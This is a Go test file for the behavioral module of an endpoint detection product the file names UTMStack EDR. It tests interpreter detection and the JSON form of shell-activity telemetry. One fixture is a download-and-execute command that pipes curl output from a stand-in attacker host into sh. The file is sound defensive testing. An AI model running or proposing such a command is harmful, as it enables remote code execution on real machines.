//go:build linux

package behavioral

import (
	"strings"
	"testing"
)
func TestIsInterpreter(t *testing.T) {
	cases := map[string][2]string{
		"/bin/bash":         {"bash", "true"},
		"/usr/bin/python3":  {"python3", "true"},
		"sh":                {"sh", "true"},
		"/usr/bin/node":     {"node", "true"},
		"/opt/app/pwsh":     {"pwsh", "true"},
		"/usr/bin/victim":   {"", "false"},
		"/bin/ls":           {"", "false"},
		"/usr/local/bin/busybox": {"busybox", "true"},
	}
	for image, want := range cases {
		name, ok := IsInterpreter(image)
		wantOK := want[1] == "true"
		if name != want[0] || ok != wantOK {
			t.Errorf("IsInterpreter(%q) = (%q, %v), want (%q, %v)", image, name, ok, want[0], wantOK)
		}
	}
}

func TestShellActivityTelemetryBranded(t *testing.T) {
	e := ShellActivityTelemetry("bash -c 'curl evil.tld | sh'", "bash")
	js, err := e.ToJSON()
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		`"source":"behavioral"`,
		`"action":"shell_activity"`,
		`"product":"UTMStack EDR"`,
		`"signature":"bash -c 'curl evil.tld | sh'"`,
	} {
		if !strings.Contains(js, want) {
			t.Fatalf("missing %q in %s", want, js)
		}
	}
}

func TestShellActivityTruncates(t *testing.T) {
	long := strings.Repeat("a", 9000)
	e := ShellActivityTelemetry(long, "bash")
	js, _ := e.ToJSON()
	// The signature must be truncated to 8192 chars (plus JSON escaping margin).
	if len(js) > 10000 {
		t.Fatalf("signature not truncated: event JSON is %d bytes", len(js))
	}
}
